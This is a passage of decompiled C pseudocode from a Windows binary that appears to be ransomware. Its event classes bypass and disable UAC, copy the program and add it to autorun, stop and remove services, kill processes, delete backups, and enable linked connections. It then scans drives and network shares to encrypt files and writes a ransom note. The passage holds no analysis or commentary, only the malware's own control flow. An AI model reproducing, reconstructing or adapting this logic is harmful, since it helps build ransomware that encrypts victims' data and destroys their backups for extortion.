          if ( v100 == v99 )
          {
            sub_40AD00(Src, 1u, v64, "}", 1u);
          }
          else
          {
            ++v99;
            v26 = Src;
            if ( v100 >= 0x10 )
              v26 = (void **)Src[0];
            *(_WORD *)((char *)v26 + v25) = 125;
          }
          v27 = (_QWORD *)sub_41FDA0((int)Block, (int)v89, (DWORD)v95, (int)Src);
          sub_414430(Src, v27);
          if ( HIDWORD(v62) >= 0x10 )
          {
            v28 = Block[0];
            if ( (unsigned int)(HIDWORD(v62) + 1) >= 0x1000 )
            {
              v28 = (void *)*((_DWORD *)Block[0] - 1);
              if ( (unsigned int)(Block[0] - v28 - 4) > 0x1F )
                _invalid_parameter_noinfo_noreturn();
            }
            sub_44775B(v28);
          }
          v29 = (char *)Src;
          if ( v100 >= 0x10 )
            v29 = (char *)Src[0];
          v30 = sub_41BC60(Block, v29, v99);
          sub_414430(Src, v30);
          if ( HIDWORD(v62) >= 0x10 )
          {
            v31 = Block[0];
            if ( (unsigned int)(HIDWORD(v62) + 1) >= 0x1000 )
            {
              v31 = (void *)*((_DWORD *)Block[0] - 1);
              if ( (unsigned int)(Block[0] - v31 - 4) > 0x1F )
                _invalid_parameter_noinfo_noreturn();
            }
            sub_44775B(v31);
          }
          LOBYTE(v104) = 15;
          v102 = 0;
          v103 = 15;
          LOBYTE(v101[0]) = 0;
          v64 = 863;
          sub_414300(v101, v60 + 1);
          sub_409C70(v101, v71);
          v32 = v102;
          if ( v103 == v102 )
          {
            sub_40AD00(v101, 1u, v64, "-", 1u);
          }
          else
          {
            ++v102;
            v33 = v101;
            if ( v103 >= 0x10 )
              v33 = (void **)v101[0];
            *(_WORD *)((char *)v33 + v32) = 45;
          }
          v34 = sub_409C70(v101, Src);
          *(_OWORD *)Block = *(_OWORD *)v34;
          v35 = *((_QWORD *)v34 + 2);
          v34[4] = 0;
          v34[5] = (void *)15;
          *(_BYTE *)v34 = 0;
          v62 = v35;
          sub_414430(Src, Block);
          if ( HIDWORD(v62) >= 0x10 )
          {
            v36 = Block[0];
            if ( (unsigned int)(HIDWORD(v62) + 1) >= 0x1000 )
            {
              v36 = (void *)*((_DWORD *)Block[0] - 1);
              if ( (unsigned int)(Block[0] - v36 - 4) > 0x1F )
                goto LABEL_151;
            }
            sub_44775B(v36);
          }
          LOBYTE(v104) = 10;
          if ( v103 < 0x10 )
            goto LABEL_82;
          v37 = v101[0];
          if ( v103 + 1 < 0x1000 || (v37 = (void *)*((_DWORD *)v101[0] - 1), (unsigned int)(v101[0] - v37 - 4) <= 0x1F) )
          {
            sub_44775B(v37);
LABEL_82:
            v38 = (char *)Src;
            if ( v100 >= 0x10 )
              v38 = (char *)Src[0];
            v39 = sub_41BC60(Block, v38, v99);
            sub_414430(Src, v39);
            if ( HIDWORD(v62) >= 0x10 )
            {
              v40 = Block[0];
              if ( (unsigned int)(HIDWORD(v62) + 1) >= 0x1000 )
              {
                v40 = (void *)*((_DWORD *)Block[0] - 1);
                if ( (unsigned int)(Block[0] - v40 - 4) > 0x1F )
                  _invalid_parameter_noinfo_noreturn();
              }
              sub_44775B(v40);
            }
            v41 = (const WCHAR *)sub_40C780(&dword_4FA3D8, (int)v101, (int)&savedregs);
            LOBYTE(v104) = 16;
            v42 = sub_405EF0(v59, v41);
            v67[1] = 0;
            v67[2] = 2;
            v67[3] = 8;
            LOBYTE(v104) = 18;
            v67[0] = (int)&ANEventPutToNote::`vftable';
            sub_409DB0(v68, v42);
            LOBYTE(v104) = 19;
            sub_409DB0(v69, Src);
            v70 = 0;
            LOBYTE(v104) = 21;
            if ( HIDWORD(v60) >= 0x10 )
            {
              v43 = v59[0];
              if ( (unsigned int)(HIDWORD(v60) + 1) >= 0x1000 )
              {
                v43 = (void *)*((_DWORD *)v59[0] - 1);
                if ( (unsigned int)(v59[0] - v43 - 4) > 0x1F )
                  goto LABEL_153;
              }
              sub_44775B(v43);
            }
            v60 = 0xF00000000i64;
            LOBYTE(v59[0]) = 0;
            LOBYTE(v104) = 22;
            if ( v103 < 8 )
              goto LABEL_96;
            v44 = v101[0];
            if ( 2 * v103 + 2 < 0x1000
              || (v44 = (void *)*((_DWORD *)v101[0] - 1), (unsigned int)(v101[0] - v44 - 4) <= 0x1F) )
            {
              sub_44775B(v44);
LABEL_96:
              v102 = 0;
              LOWORD(v101[0]) = 0;
              v45 = *this;
              v103 = 7;
              (*(void (__thiscall **)(int *, int *))(v45 + 4))(this, v67);
              v63 = v70;
              sub_41B3D0(v67);
              if ( v100 >= 0x10 )
              {
                v46 = Src[0];
                if ( v100 + 1 >= 0x1000 )
                {
                  v46 = (void *)*((_DWORD *)Src[0] - 1);
                  if ( (unsigned int)(Src[0] - v46 - 4) > 0x1F )
                    goto LABEL_154;
                }
                sub_44775B(v46);
              }
              v99 = 0;
              v100 = 15;
              LOBYTE(Src[0]) = 0;
              if ( v76 >= 0x10 )
              {
                v47 = v75[0];
                if ( v76 + 1 >= 0x1000 )
                {
                  v47 = (void *)*((_DWORD *)v75[0] - 1);
                  if ( (unsigned int)(v75[0] - v47 - 4) > 0x1F )
                    goto LABEL_154;
                }
                sub_44775B(v47);
              }
              v85[0] = (int)&ANEventGetID::`vftable';
              if ( v88 >= 0x10 )
              {
                v48 = v86;
                if ( v88 + 1 >= 0x1000 )
                {
                  v48 = (_BYTE *)*((_DWORD *)v86 - 1);
                  if ( (unsigned int)((_BYTE *)v86 - v48 - 4) > 0x1F )
                    goto LABEL_154;
                }
                sub_44775B(v48);
              }
              v87 = 0;
              v88 = 15;
              LOBYTE(v86) = 0;
              v85[0] = (int)&ANIEvent::`vftable';
              if ( v74 >= 0x10 )
              {
                v49 = v73[0];
                if ( v74 + 1 >= 0x1000 )
                {
                  v49 = (void *)*((_DWORD *)v73[0] - 1);
                  if ( (unsigned int)(v73[0] - v49 - 4) > 0x1F )
                    goto LABEL_154;
                }
                sub_44775B(v49);
              }
              sub_41BB30(v77);
              if ( HIDWORD(v72) >= 0x10 )
              {
                v50 = v71[0];
                if ( (unsigned int)(HIDWORD(v72) + 1) >= 0x1000 )
                {
                  v50 = (void *)*((_DWORD *)v71[0] - 1);
                  if ( (unsigned int)(v71[0] - v50 - 4) > 0x1F )
                    goto LABEL_154;
                }
                sub_44775B(v50);
              }
              v65[0] = (int)&ANIEvent::`vftable';
              if ( v91 >= 0x10 )
              {
                v51 = v89[0];
                if ( v91 + 1 >= 0x1000 )
                {
                  v51 = (void *)*((_DWORD *)v89[0] - 1);
                  if ( (unsigned int)(v89[0] - v51 - 4) > 0x1F )
                    goto LABEL_154;
                }
                sub_44775B(v51);
              }
              if ( v97 >= 0x10 )
              {
                v52 = v95[0];
                if ( v97 + 1 >= 0x1000 )
                {
                  v52 = (void *)*((_DWORD *)v95[0] - 1);
                  if ( (unsigned int)(v95[0] - v52 - 4) > 0x1F )
                    goto LABEL_154;
                }
                sub_44775B(v52);
              }
              v96 = 0;
              v97 = 15;
              LOBYTE(v95[0]) = 0;
              if ( v94 < 0x10 )
                goto LABEL_141;
              v53 = v92[0];
              if ( v94 + 1 < 0x1000 || (v53 = (void *)*((_DWORD *)v92[0] - 1), (unsigned int)(v92[0] - v53 - 4) <= 0x1F) )
              {
                sub_44775B(v53);
                goto LABEL_141;
              }
LABEL_154:
              _invalid_parameter_noinfo_noreturn();
            }
LABEL_153:
            _invalid_parameter_noinfo_noreturn();
          }
LABEL_151:
          _invalid_parameter_noinfo_noreturn();
        }
LABEL_148:
        _invalid_parameter_noinfo_noreturn();
      }
LABEL_147:
      _invalid_parameter_noinfo_noreturn();
    }
    if ( v91 >= 0x10 )
    {
      v54 = v89[0];
      if ( v91 + 1 >= 0x1000 )
      {
        v54 = (void *)*((_DWORD *)v89[0] - 1);
        if ( (unsigned int)(v89[0] - v54 - 4) > 0x1F )
          goto LABEL_155;
      }
      sub_44775B(v54);
    }
    if ( v97 < 0x10 )
      goto LABEL_136;
    v55 = v95[0];
    if ( v97 + 1 < 0x1000 || (v55 = (void *)*((_DWORD *)v95[0] - 1), (unsigned int)(v95[0] - v55 - 4) <= 0x1F) )
    {
      sub_44775B(v55);
LABEL_136:
      if ( v94 >= 0x10 )
      {
        v56 = v92[0];
        if ( v94 + 1 >= 0x1000 )
        {
          v56 = (void *)*((_DWORD *)v92[0] - 1);
          if ( (unsigned int)(v92[0] - v56 - 4) > 0x1F )
            _invalid_parameter_noinfo_noreturn();
        }
        sub_44775B(v56);
      }
      goto LABEL_140;
    }
LABEL_155:
    _invalid_parameter_noinfo_noreturn();
  }
LABEL_140:
  v63 = 0;
LABEL_141:
  v81[0] = (int)&ANEventGetEncKey::`vftable';
  if ( v84 >= 0x10 )
  {
    v57 = v82;
    if ( v84 + 1 >= 0x1000 )
    {
      v57 = (_BYTE *)*((_DWORD *)v82 - 1);
      if ( (unsigned int)((_BYTE *)v82 - v57 - 4) > 0x1F )
        _invalid_parameter_noinfo_noreturn();
    }
    sub_44775B(v57);
  }
  return v63;
}
// 404630: using guessed type void __noreturn sub_404630(void);
// 4B15AC: using guessed type void *ANIEvent::`vftable';
// 4B17D0: using guessed type void *ANEventGetEncKey::`vftable';
// 4B18F4: using guessed type void *ANEventGetID::`vftable';
// 4B18FC: using guessed type void *ANEventPutToNote::`vftable';
// 4B1A1C: using guessed type void *ANEventGetExternalIP::`vftable';
// 4B1A24: using guessed type void *ANEventGetLid::`vftable';
// 4E986C: using guessed type wchar_t asc_4E986C[2];
// 420000: using guessed type WCHAR WideCharStr[8];
// 420000: using guessed type int var_17C[6];
// 420000: using guessed type int var_164[6];

//----- (00420D70) --------------------------------------------------------
int __thiscall sub_420D70(DWORD *this)
{
  DWORD *v1; // esi
  bool v2; // zf
  DWORD v3; // eax
  void *v4; // ecx
  int v5; // edx
  void *v6; // ecx
  int v7; // edx
  void (__thiscall *v8)(DWORD *, void ***); // esi
  const WCHAR *v9; // eax
  _DWORD *v10; // eax
  void *v11; // ecx
  int v12; // edx
  void *v13; // ecx
  unsigned int v14; // edx
  void *v15; // ecx
  int v16; // edx
  void *v17; // ecx
  int v18; // edx
  _DWORD *v19; // eax
  unsigned int v20; // esi
  _DWORD *v21; // edi
  _DWORD *v22; // edi
  _DWORD *v23; // edi
  DWORD v24; // eax
  DWORD v25; // eax
  DWORD v26; // eax
  _DWORD *v27; // edi
  void (__thiscall *v28)(DWORD *, _DWORD *); // esi
  _DWORD *v29; // eax
  void *v30; // ecx
  unsigned int v31; // edx
  int *v32; // edi
  bool v33; // cf
  int *v34; // ecx
  DWORD v35; // eax
  unsigned int v36; // eax
  __int128 v37; // xmm0
  int v38; // esi
  void *v39; // ecx
  unsigned int v40; // edx
  void *v41; // ecx
  unsigned int v42; // edx
  _DWORD *v43; // eax
  int *v44; // ecx
  _DWORD *v45; // eax
  int *v46; // eax
  void *v47; // ecx
  int v48; // edx
  void *v49; // ecx
  unsigned int v50; // edx
  void *v51; // ecx
  unsigned int v52; // edx
  _DWORD *v54[5]; // [esp-18h] [ebp-264h] BYREF
  int v55; // [esp-4h] [ebp-250h]
  void (__thiscall *v56)(DWORD *, int *); // [esp+Ch] [ebp-240h]
  int v57; // [esp+10h] [ebp-23Ch]
  void *Src; // [esp+14h] [ebp-238h]
  WCHAR WideCharStr[8]; // [esp+18h] [ebp-234h] BYREF
  __int64 v60; // [esp+28h] [ebp-224h]
  int *i; // [esp+30h] [ebp-21Ch]
  DWORD *v62; // [esp+34h] [ebp-218h]
  int v63; // [esp+38h] [ebp-214h]
  void *v64; // [esp+3Ch] [ebp-210h] BYREF
  void **v65; // [esp+40h] [ebp-20Ch] BYREF
  void **v66; // [esp+44h] [ebp-208h] BYREF
  int v67; // [esp+48h] [ebp-204h]
  int v68; // [esp+4Ch] [ebp-200h]
  unsigned int v69; // [esp+50h] [ebp-1FCh]
  int v70[4]; // [esp+54h] [ebp-1F8h] BYREF
  int v71[6]; // [esp+64h] [ebp-1E8h] BYREF
  char v72; // [esp+7Ch] [ebp-1D0h]
  int v73[4]; // [esp+80h] [ebp-1CCh] BYREF
  int v74; // [esp+90h] [ebp-1BCh] BYREF
  int v75; // [esp+A0h] [ebp-1ACh]
  unsigned int v76; // [esp+A4h] [ebp-1A8h]
  int v77[4]; // [esp+A8h] [ebp-1A4h] BYREF
  int v78[4]; // [esp+B8h] [ebp-194h] BYREF
  void *Block[5]; // [esp+C8h] [ebp-184h] BYREF
  unsigned int v80; // [esp+DCh] [ebp-170h]
  char v81; // [esp+E0h] [ebp-16Ch]
  int v82[4]; // [esp+E4h] [ebp-168h] BYREF
  void *v83; // [esp+F4h] [ebp-158h]
  _BYTE *v84; // [esp+F8h] [ebp-154h]
  int v85; // [esp+FCh] [ebp-150h]
  int v86[4]; // [esp+100h] [ebp-14Ch] BYREF
  int *v87; // [esp+110h] [ebp-13Ch]
  int *v88; // [esp+114h] [ebp-138h]
  int v89; // [esp+118h] [ebp-134h]
  void *v90[5]; // [esp+11Ch] [ebp-130h] BYREF
  unsigned int v91; // [esp+130h] [ebp-11Ch]
  int v92[4]; // [esp+134h] [ebp-118h] BYREF
  void *v93; // [esp+144h] [ebp-108h] BYREF
  int v94; // [esp+154h] [ebp-F8h]
  unsigned int v95; // [esp+158h] [ebp-F4h]
  int v96[4]; // [esp+15Ch] [ebp-F0h] BYREF
  void *v97; // [esp+16Ch] [ebp-E0h]
  _BYTE *v98; // [esp+170h] [ebp-DCh]
  int v99; // [esp+174h] [ebp-D8h]
  int v100[4]; // [esp+178h] [ebp-D4h] BYREF
  int v101; // [esp+188h] [ebp-C4h] BYREF
  _DWORD *v102; // [esp+18Ch] [ebp-C0h]
  int v103; // [esp+190h] [ebp-BCh]
  int v104; // [esp+194h] [ebp-B8h]
  int v105[4]; // [esp+198h] [ebp-B4h] BYREF
  int v106; // [esp+1A8h] [ebp-A4h] BYREF
  _DWORD *v107; // [esp+1ACh] [ebp-A0h]
  int v108; // [esp+1B0h] [ebp-9Ch]
  int v109[4]; // [esp+1B4h] [ebp-98h] BYREF
  int v110; // [esp+1C4h] [ebp-88h] BYREF
  _DWORD *v111; // [esp+1C8h] [ebp-84h]
  int v112; // [esp+1CCh] [ebp-80h]
  void **v113; // [esp+1D0h] [ebp-7Ch] BYREF
  int v114; // [esp+1D4h] [ebp-78h]
  int v115; // [esp+1D8h] [ebp-74h]
  int v116; // [esp+1DCh] [ebp-70h]
  _DWORD v117[3]; // [esp+1E0h] [ebp-6Ch] BYREF
  int v118[3]; // [esp+1ECh] [ebp-60h] BYREF
  int v119; // [esp+1F8h] [ebp-54h] BYREF
  void *v120[5]; // [esp+1FCh] [ebp-50h] BYREF
  unsigned int v121; // [esp+210h] [ebp-3Ch]
  void **v122; // [esp+214h] [ebp-38h] BYREF
  int v123; // [esp+218h] [ebp-34h]
  int v124; // [esp+21Ch] [ebp-30h]
  int v125; // [esp+220h] [ebp-2Ch] BYREF
  void *v126[3]; // [esp+224h] [ebp-28h] BYREF
  void *v127; // [esp+230h] [ebp-1Ch]
  void *v128; // [esp+234h] [ebp-18h]
  unsigned int v129; // [esp+238h] [ebp-14h]
  int v130; // [esp+248h] [ebp-4h]
  int savedregs; // [esp+24Ch] [ebp+0h] BYREF

  v1 = this;
  v62 = this;
  v57 = 0;
  v70[1] = 0;
  v70[2] = 3;
  v70[3] = 0;
  v130 = 0;
  v70[0] = (int)&ANEventIsRunning::`vftable';
  sub_4055B0(v71, this + 17);
  v72 = 0;
  v130 = 1;
  (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v70);
  if ( !v72 )
  {
    v2 = v1[8] == 0;
    v3 = *v1;
    v67 = 0;
    v68 = 3;
    if ( v2 )
    {
      v69 = 1;
      v66 = &ANEventBypassUAC::`vftable';
      LOBYTE(v130) = 2;
      (*(void (__thiscall **)(DWORD *, void ***))(v3 + 4))(v1, &v66);
      v3 = *v1;
      v67 = 0;
      v68 = 3;
      v69 = 25;
      v66 = &ANEventDisableUAC::`vftable';
      LOBYTE(v130) = 3;
    }
    else
    {
      v69 = 25;
      v66 = &ANEventDisableUAC::`vftable';
      LOBYTE(v130) = 4;
    }
    (*(void (__thiscall **)(DWORD *, void ***))(v3 + 4))(v1, &v66);
    v92[1] = 0;
    v92[2] = 2;
    v92[3] = 10;
    v92[0] = (int)&ANEventGetPublicKey::`vftable';
    v94 = 0;
    v95 = 15;
    LOBYTE(v93) = 0;
    LOBYTE(v130) = 5;
    (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v92);
    if ( !v94 )
      goto LABEL_12;
    v78[1] = 0;
    v78[2] = 6;
    v78[3] = 32;
    LOBYTE(v130) = 6;
    v78[0] = (int)&ANEventInitFileProcess::`vftable';
    sub_409DB0(Block, &v93);
    v81 = 0;
    LOBYTE(v130) = 7;
    (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v78);
    if ( !v81 )
    {
      v78[0] = (int)&ANEventInitFileProcess::`vftable';
      if ( v80 >= 0x10 )
      {
        v4 = Block[0];
        v5 = v80 + 1;
        if ( v80 + 1 >= 0x1000 )
        {
          v4 = (void *)*((_DWORD *)Block[0] - 1);
          v5 = v80 + 36;
          if ( (unsigned int)(Block[0] - v4 - 4) > 0x1F )
            goto LABEL_84;
        }
        v55 = v5;
        sub_44775B(v4);
      }
      Block[4] = 0;
      v80 = 15;
      LOBYTE(Block[0]) = 0;
      v78[0] = (int)&ANIEvent::`vftable';
LABEL_12:
      v92[0] = (int)&ANEventGetPublicKey::`vftable';
      if ( v95 < 0x10 )
      {
LABEL_82:
        v94 = 0;
        v95 = 15;
        LOBYTE(v93) = 0;
        v92[0] = (int)&ANIEvent::`vftable';
        return sub_41B120(v70);
      }
      v6 = v93;
      v7 = v95 + 1;
      if ( v95 + 1 < 0x1000
        || (v6 = (void *)*((_DWORD *)v93 - 1), v7 = v95 + 36, (unsigned int)((_BYTE *)v93 - (_BYTE *)v6 - 4) <= 0x1F) )
      {
        v55 = v7;
        sub_44775B(v6);
        goto LABEL_82;
      }
LABEL_84:
      _invalid_parameter_noinfo_noreturn();
    }
    if ( sub_420000((int *)v1) )
    {
LABEL_34:
      if ( !v1[8] )
      {
        v123 = 0;
        v124 = 3;
        v125 = 22;
        LOBYTE(v130) = 15;
        v122 = &ANEventCopySelf::`vftable';
        sub_4055B0(v126, v1 + 23);
        LOBYTE(v130) = 16;
        (*(void (__thiscall **)(DWORD *, void ***))(*v1 + 4))(v1, &v122);
        v66 = 0;
        v67 = 2;
        v68 = 16;
        v65 = &ANEventGetInterval::`vftable';
        v69 = 0;
        LOBYTE(v130) = 17;
        (*(void (__thiscall **)(DWORD *, void ***))(*v1 + 4))(v1, &v65);
        v19 = v1 + 11;
        v114 = 0;
        v20 = v69;
        v115 = 3;
        v116 = 23;
        LOBYTE(v130) = 18;
        v113 = &ANEventAddToAutorun::`vftable';
        sub_4055B0(v117, v19);
        LOBYTE(v130) = 19;
        sub_4055B0(&v119, v126);
        v121 = v20;
        v1 = v62;
        LOBYTE(v130) = 20;
        (*(void (__thiscall **)(DWORD *, void ***))(*v62 + 4))(v62, &v113);
        sub_41B780(&v113);
        v65 = &ANIEvent::`vftable';
        sub_41B6E0(&v122);
      }
      v77[1] = 0;
      v77[2] = 4;
      v77[3] = 30;
      v77[0] = (int)&ANEventHiddenDevicesScan::`vftable';
      LOBYTE(v130) = 21;
      (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v77);
      v96[1] = 0;
      v96[2] = 2;
      v96[3] = 14;
      v96[0] = (int)&ANEventGetServices::`vftable';
      v97 = 0;
      v98 = 0;
      v99 = 0;
      LOBYTE(v130) = 22;
      (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v96);
      v100[1] = 0;
      v100[2] = 3;
      v100[3] = 26;
      LOBYTE(v130) = 23;
      v21 = v97;
      v100[0] = (int)&ANEventStopServices::`vftable';
      v101 = 0;
      v102 = 0;
      v103 = 0;
      v63 = (int)v98;
      if ( v97 != v98 )
      {
        sub_4121C0((unsigned int *)&v101, (v98 - (_BYTE *)v97) / 24);
        i = &v101;
        LOBYTE(v130) = 24;
        v102 = sub_412BC0(v21, (_DWORD *)v63, (_DWORD *)v101);
      }
      v104 = 1000;
      LOBYTE(v130) = 25;
      (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v100);
      v109[1] = 0;
      v109[2] = 3;
      v109[3] = 28;
      LOBYTE(v130) = 26;
      v22 = v97;
      v109[0] = (int)&ANEventRemoveServices::`vftable';
      v110 = 0;
      v111 = 0;
      v112 = 0;
      v63 = (int)v98;
      if ( v97 != v98 )
      {
        sub_4121C0((unsigned int *)&v110, (v98 - (_BYTE *)v97) / 24);
        i = &v110;
        LOBYTE(v130) = 27;
        v111 = sub_412BC0(v22, (_DWORD *)v63, (_DWORD *)v110);
      }
      LOBYTE(v130) = 28;
      (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v109);
      v82[1] = 0;
      v82[2] = 2;
      v82[3] = 15;
      v82[0] = (int)&ANEventGetProcesses::`vftable';
      v83 = 0;
      v84 = 0;
      v85 = 0;
      LOBYTE(v130) = 29;
      (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v82);
      v105[1] = 0;
      v105[2] = 3;
      v105[3] = 29;
      LOBYTE(v130) = 30;
      v23 = v83;
      v105[0] = (int)&ANEventKillProcesses::`vftable';
      v106 = 0;
      v107 = 0;
      v108 = 0;
      v63 = (int)v84;
      if ( v83 != v84 )
      {
        sub_4121C0((unsigned int *)&v106, (v84 - (_BYTE *)v83) / 24);
        i = &v106;
        LOBYTE(v130) = 31;
        v107 = sub_412BC0(v23, (_DWORD *)v63, (_DWORD *)v106);
      }
      LOBYTE(v130) = 32;
      (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v105);
      v24 = *v1;
      v66 = 0;
      v67 = 3;
      v68 = 24;
      v65 = &ANEventRemoveBackups::`vftable';
      v69 = 3;
      LOBYTE(v130) = 33;
      (*(void (__thiscall **)(DWORD *, void ***))(v24 + 4))(v1, &v65);
      v25 = *v1;
      v67 = 0;
      v68 = 3;
      v69 = 21;
      v66 = &ANEventEnableLinkedConnections::`vftable';
      LOBYTE(v130) = 34;
      (*(void (__thiscall **)(DWORD *, void ***))(v25 + 4))(v1, &v66);
      v73[1] = 0;
      v73[2] = 2;
      v73[3] = 19;
      v73[0] = (int)&ANEventGetNoteName::`vftable';
      v75 = 0;
      v76 = 7;
      LOWORD(v74) = 0;
      LOBYTE(v130) = 35;
      (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v73);
      while ( 1 )
      {
        v26 = *v1;
        v67 = 0;
        v68 = 5;
        v69 = 34;
        v66 = &ANEventScanWhiteListAsync::`vftable';
        LOBYTE(v130) = 36;
        (*(void (__thiscall **)(DWORD *, void ***))(v26 + 4))(v1, &v66);
        v66 = &ANIEvent::`vftable';
        v126[0] = 0;
        v126[1] = (void *)4;
        v126[2] = (void *)2;
        v125 = (int)&ANEventDriveScan::`vftable';
        v127 = 0;
        v128 = 0;
        v129 = 0;
        LOBYTE(v130) = 37;
        (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, &v125);
        v27 = v127;
        v63 = (int)v128;
        if ( v127 != v128 )
        {
          do
          {
            v28 = *(void (__thiscall **)(DWORD *, _DWORD *))(*v1 + 4);
            sub_4055B0(v54, v27);
            v29 = sub_414A20(v118, 5, v54[0], (int)v54[1], (int)v54[2], (int)v54[3], (int)v54[4], v55);
            LOBYTE(v130) = 38;
            v28(v62, v29);
            LOBYTE(v130) = 37;
            v118[0] = (int)&ANEventScanFileSystemAsync::`vftable';
            if ( v121 >= 8 )
            {
              v30 = v120[0];
              v31 = 2 * v121 + 2;
              if ( v31 >= 0x1000 )
              {
                v30 = (void *)*((_DWORD *)v120[0] - 1);
                v31 = 2 * v121 + 37;
                if ( (unsigned int)(v120[0] - v30 - 4) > 0x1F )
                  goto LABEL_85;
              }
              v55 = v31;
              sub_44775B(v30);
            }
            v1 = v62;
            v27 += 6;
          }
          while ( v27 != (_DWORD *)v63 );
        }
        v86[1] = 0;
        v86[2] = 4;
        v86[3] = 3;
        v86[0] = (int)&ANEventShareScan::`vftable';
        v87 = 0;
        v88 = 0;
        v89 = 0;
        LOBYTE(v130) = 39;
        (*(void (__thiscall **)(DWORD *, int *))(*v1 + 4))(v1, v86);
        v32 = v87;
        for ( i = v88; v32 != i; v32 += 6 )
        {
          v33 = (unsigned int)v32[5] < 8;
          v34 = v32;
          v35 = *v1;
          Src = v32;
          v56 = *(void (__thiscall **)(DWORD *, int *))(v35 + 4);
          v36 = v32[4];
          v63 = v36;
          if ( !v33 )
          {
            v34 = (int *)*v32;
            Src = (void *)*v32;
          }
          if ( v36 >= 8 )
          {
            v38 = v36 | 7;
            if ( (v36 | 7) > 0x7FFFFFFE )
              v38 = 2147483646;
            *(_DWORD *)WideCharStr = sub_404910(v38 + 1);
            memmove(*(void **)WideCharStr, Src, 2 * v63 + 2);
            v36 = v63;
            HIDWORD(v60) = v38;
            v1 = v62;
          }
          else
          {
            v37 = *(_OWORD *)v34;
            HIDWORD(v60) = 7;
            *(_OWORD *)WideCharStr = v37;
          }
          LODWORD(v60) = v36;
          v118[1] = 0;
          v118[2] = 5;
          v119 = 5;
          LOBYTE(v130) = 41;
          v118[0] = (int)&ANEventScanFileSystemAsync::`vftable';
          sub_4055B0(v120, WideCharStr);
          LOBYTE(v130) = 39;
          if ( HIDWORD(v60) >= 8 )
          {
            v39 = *(void **)WideCharStr;
            v40 = 2 * HIDWORD(v60) + 2;
            if ( v40 >= 0x1000 )
            {
              v39 = *(void **)(*(_DWORD *)WideCharStr - 4);
              v40 = 2 * HIDWORD(v60) + 37;
              if ( (unsigned int)(*(_DWORD *)WideCharStr - (_DWORD)v39 - 4) > 0x1F )
                goto LABEL_85;
            }
            v55 = v40;
            sub_44775B(v39);
          }
          LOBYTE(v130) = 42;
          v56(v1, v118);
          LOBYTE(v130) = 39;
          v118[0] = (int)&ANEventScanFileSystemAsync::`vftable';
          if ( v121 >= 8 )
          {
            v41 = v120[0];
            v42 = 2 * v121 + 2;
            if ( v42 >= 0x1000 )
            {
              v41 = (void *)*((_DWORD *)v120[0] - 1);
              v42 = 2 * v121 + 37;
              if ( (unsigned int)(v120[0] - v41 - 4) > 0x1F )
                goto LABEL_85;
            }
            v55 = v42;
            sub_44775B(v41);
          }
        }
        v43 = (_DWORD *)sub_40C780(&dword_4FA540, (int)v120, (int)&savedregs);
        LOBYTE(v130) = 43;
        v44 = &v74;
        v55 = v75;
        if ( v76 >= 8 )
          v44 = (int *)v74;
        v45 = sub_4044A0(v43, v44, v55);
        v57 |= 1u;
        v60 = 0i64;
        *(_OWORD *)WideCharStr = *(_OWORD *)v45;
        v60 = *((_QWORD *)v45 + 2);
        v45[4] = 0;
        v45[5] = 7;
        *(_WORD *)v45 = 0;
        LOBYTE(v130) = 44;
        v46 = sub_405EF0(v90, WideCharStr);
        LOBYTE(v130) = 45;
        sub_41F670(v46);
        LOBYTE(v130) = 44;
        if ( v91 >= 0x10 )
        {
          v47 = v90[0];
          v48 = v91 + 1;
          if ( v91 + 1 >= 0x1000 )
          {
            v47 = (void *)*((_DWORD *)v90[0] - 1);
            v48 = v91 + 36;
            if ( (unsigned int)(v90[0] - v47 - 4) > 0x1F )
              goto LABEL_85;
          }
          v55 = v48;
          sub_44775B(v47);
        }
        LOBYTE(v130) = 43;
        v90[4] = 0;
        v91 = 15;
        LOBYTE(v90[0]) = 0;
        if ( HIDWORD(v60) >= 8 )
        {
          v49 = *(void **)WideCharStr;
          v50 = 2 * HIDWORD(v60) + 2;
          if ( v50 >= 0x1000 )
          {
            v49 = *(void **)(*(_DWORD *)WideCharStr - 4);
            v50 = 2 * HIDWORD(v60) + 37;
            if ( (unsigned int)(*(_DWORD *)WideCharStr - (_DWORD)v49 - 4) > 0x1F )
              goto LABEL_85;
          }
          v55 = v50;
          sub_44775B(v49);
        }
        LOBYTE(v130) = 39;
        v60 = 0x700000000i64;
        WideCharStr[0] = 0;
        if ( v121 >= 8 )
        {
          v51 = v120[0];
          v52 = 2 * v121 + 2;
          if ( v52 >= 0x1000 )
          {
            v51 = (void *)*((_DWORD *)v120[0] - 1);
            v52 = 2 * v121 + 37;
            if ( (unsigned int)(v120[0] - v51 - 4) > 0x1F )
              goto LABEL_85;
          }
          v55 = v52;
          sub_44775B(v51);
        }
        Sleep(v1[9]);
        sub_41B280(v86);
        sub_41B1C0(&v125);
      }
    }
    v123 = 0;
    v124 = 6;
    v125 = 6;
    v122 = &ANEventGetID::`vftable';
    v128 = 0;
    v129 = 15;
    LOBYTE(v126[0]) = 0;
    LOBYTE(v130) = 8;
    (*(void (__thiscall **)(DWORD *, void ***))(*v1 + 4))(v1, &v122);
    sub_41AFD0((int)v90, v126);
    LOBYTE(v130) = 9;
    v8 = *(void (__thiscall **)(DWORD *, void ***))(*v1 + 4);
    v9 = (const WCHAR *)sub_40C780(&dword_4FA3D8, (int)&v64, (int)&savedregs);
    LOBYTE(v130) = 10;
    v10 = sub_405EF0(WideCharStr, v9);
    v114 = 0;
    v115 = 2;
    v116 = 8;
    LOBYTE(v130) = 12;
    v113 = &ANEventPutToNote::`vftable';
    sub_409DB0(v117, v10);
    LOBYTE(v130) = 13;
    sub_409DB0(&v119, v90);
    LOBYTE(v121) = 0;
    LOBYTE(v130) = 14;
    v8(v62, &v113);
    sub_41B3D0(&v113);
    LOBYTE(v130) = 10;
    if ( HIDWORD(v60) >= 0x10 )
    {
      v11 = *(void **)WideCharStr;
      v12 = HIDWORD(v60) + 1;
      if ( (unsigned int)(HIDWORD(v60) + 1) >= 0x1000 )
      {
